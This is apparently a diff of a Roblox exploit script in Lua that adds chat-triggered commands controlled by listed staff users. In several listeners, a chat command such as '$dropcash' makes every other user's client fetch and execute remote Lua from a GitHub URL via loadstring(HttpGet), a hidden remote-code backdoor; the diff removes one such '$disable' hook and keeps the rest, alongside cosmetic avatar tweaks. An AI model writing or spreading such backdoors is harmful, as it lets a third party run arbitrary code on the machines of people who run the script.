@@ -238,14 +238,6 @@ function premium()
 		end)
 		
 		v.Chatted:connect(function(cht)
-        if cht:match("$disable .") then
-            if game.Players.LocalPlayer ~= v then
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/perm.lua"))()
-            end
-        end
-    end)
-		
-		v.Chatted:connect(function(cht)
 			if cht:match("$dropcash .") then
 				if game.Players.LocalPlayer ~= v then
 				loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/dropcash.lua"))()
@@ -277,58 +269,48 @@ function premium()
 			end
 		end)
 		v.Chatted:connect(function(cht)
-			if cht:match("$emoji 🔥") then
-				if game.Players.LocalPlayer ~= v then
-								while true do
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🔥]'..v.DisplayName)
-									wait(1)
-									end
-				end
-			end
-		end)
-		v.Chatted:connect(function(cht)
 			if cht:match("$animate") then
 				if game.Players.LocalPlayer ~= v then
 								while true do
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] z4')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] z4')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] za')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za7')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] za7')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.1')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.1')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.l')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.l')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lv')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lv')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu4')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu4')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lua')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lua')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] discord.gg/zp')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] discord.gg/zp')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.lu')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.lu')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.l')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.l')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap.')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap.')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] zap')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] zap')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] za')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] za')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] z')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] z')
 								wait(1)
-					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[🌟] ')
+					v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑] ')
 								wait(1)
 					end
 				end
@@ -370,13 +352,40 @@ function premium()
 			renaming = false
 			if StarId[v.UserId] then
 		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
-			elseif Staff[v.UserId] then
+			elseif StaffId[v.UserId] then
             v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
 			elseif AdminId[v.UserId] then
 			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
 			end
 		end
 	end
+	end)
+	
+	v.Chatted:connect(function(cht)
+		if cht:match("$headless") then
+			if game.Players.LocalPlayer ~= v then
+			    v.Character.Head.Transparency = 1
+                for i,v in pairs(v.Character.Head:GetChildren()) do
+                if (v:IsA("Decal")) then
+                    v:Destroy()
+                    end
+                end
+			end
+	    end
+	end)
+	
+	v.Chatted:connect(function(cht)
+		if cht:match("$korblox") then
+			if game.Players.LocalPlayer ~= v then
+	            local chr = v.Character
+                chr.RightLowerLeg.MeshId = "902942093"
+	            chr.RightLowerLeg.Transparency = "1"
+	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+	            chr.RightFoot.MeshId = "902942089"
+	            chr.RightFoot.Transparency = "1"
+			end
+	    end
 	end)
 
 end
@@ -638,13 +647,40 @@ local freeze = function()
 			renaming = false
 			if StarId[v.UserId] then
 		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
-			elseif Staff[v.UserId] then
+			elseif StaffId[v.UserId] then
             v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
 			elseif AdminId[v.UserId] then
 			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
 			end
 		end
 	end
+	end)
+	
+	v.Chatted:connect(function(cht)
+		if cht:match("$headless") then
+			if game.Players.LocalPlayer ~= v then
+			    v.Character.Head.Transparency = 1
+                for i,v in pairs(v.Character.Head:GetChildren()) do
+                if (v:IsA("Decal")) then
+                    v:Destroy()
+                    end
+                end
+			end
+	    end
+	end)
+	
+	v.Chatted:connect(function(cht)
+		if cht:match("$korblox") then
+			if game.Players.LocalPlayer ~= v then
+	            local chr = v.Character
+                chr.RightLowerLeg.MeshId = "902942093"
+	            chr.RightLowerLeg.Transparency = "1"
+	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+	            chr.RightFoot.MeshId = "902942089"
+	            chr.RightFoot.Transparency = "1"
+			end
+	    end
 	end)
 
 end
@@ -955,13 +991,40 @@ local freeze = function()
 			renaming = false
 			if StarId[v.UserId] then
 		    v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[⭐]'..v.DisplayName)
-			elseif Staff[v.UserId] then
+			elseif StaffId[v.UserId] then
             v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[👑]'..v.DisplayName)
 			elseif AdminId[v.UserId] then
 			v.Character:FindFirstChildWhichIsA('Humanoid').DisplayName = ('[💎]'..v.DisplayName)
 			end
 		end
 	end
+	end)
+	
+	v.Chatted:connect(function(cht)
+		if cht:match("$headless") then
+			if game.Players.LocalPlayer ~= v then
+			    v.Character.Head.Transparency = 1
+                for i,v in pairs(v.Character.Head:GetChildren()) do
+                if (v:IsA("Decal")) then
+                    v:Destroy()
+                    end
+                end
+			end
+	    end
+	end)
+	
+	v.Chatted:connect(function(cht)
+		if cht:match("$korblox") then
+			if game.Players.LocalPlayer ~= v then
+	            local chr = v.Character
+                chr.RightLowerLeg.MeshId = "902942093"
+	            chr.RightLowerLeg.Transparency = "1"
+	            chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+	            chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+	            chr.RightFoot.MeshId = "902942089"
+	            chr.RightFoot.Transparency = "1"
+			end
+	    end
 	end)
 ------UNEXPECTED NVM LOL--------
 		end
